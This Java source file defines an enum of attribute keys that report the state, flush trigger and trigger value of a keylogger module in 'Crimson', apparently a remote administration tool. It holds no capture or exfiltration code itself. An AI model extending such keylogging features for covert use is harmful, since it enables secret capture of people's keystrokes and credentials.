package com.subterranean_security.crimson.core.attribute.keys.singular;

import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.store.ConfigStore;
import com.subterranean_security.crimson.core.attribute.keys.SingularKey;
import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.State;
import com.subterranean_security.crimson.universal.Universal.Instance;

/**
 * Keylogger attribute keys
 * 
 * @author cilki
 * @since 4.0.0
 */
public enum AK_KEYLOGGER implements SingularKey {
	STATE, TRIGGER, TRIGGER_VALUE;

	@Override
	public String toString() {
		switch (this) {
		case STATE:
			return "Keylogger State";
		case TRIGGER:
			return "Keylogger Trigger";
		case TRIGGER_VALUE:
			return "Keylogger Trigger Value";
		default:
			return super.toString();
		}
	}

	@Override
	public Object query() {
		switch (this) {
		case STATE:
			State s = null;
			if (Keylogger.isInstalled()) {
				s = Keylogger.isOnline() ? State.ONLINE : State.OFFLINE;
			} else {
				s = State.UNINSTALLED;
			}
			return "" + s.ordinal();
		case TRIGGER:
			return ConfigStore.getConfig().getKeyloggerFlushMethod().ordinal();
		case TRIGGER_VALUE:
			return ConfigStore.getConfig().getKeyloggerFlushValue();
		default:
			throw new UnsupportedOperationException("Cannot query: " + this);
		}
	}

	@Override
	public boolean isCompatible(OSFAMILY os, Instance instance) {
		switch (this) {
		case STATE:
		case TRIGGER:
		case TRIGGER_VALUE:
			return instance == Instance.CLIENT;
		default:
			return SingularKey.super.isCompatible(os, instance);
		}
	}

	@Override
	public String toSuperString() {
		return super.toString();
	}

	@Override
	public int getConstID() {
		return this.ordinal();
	}

	private static final int TYPE_ID = 7;

	@Override
	public int getTypeID() {
		return TYPE_ID;
	}

}
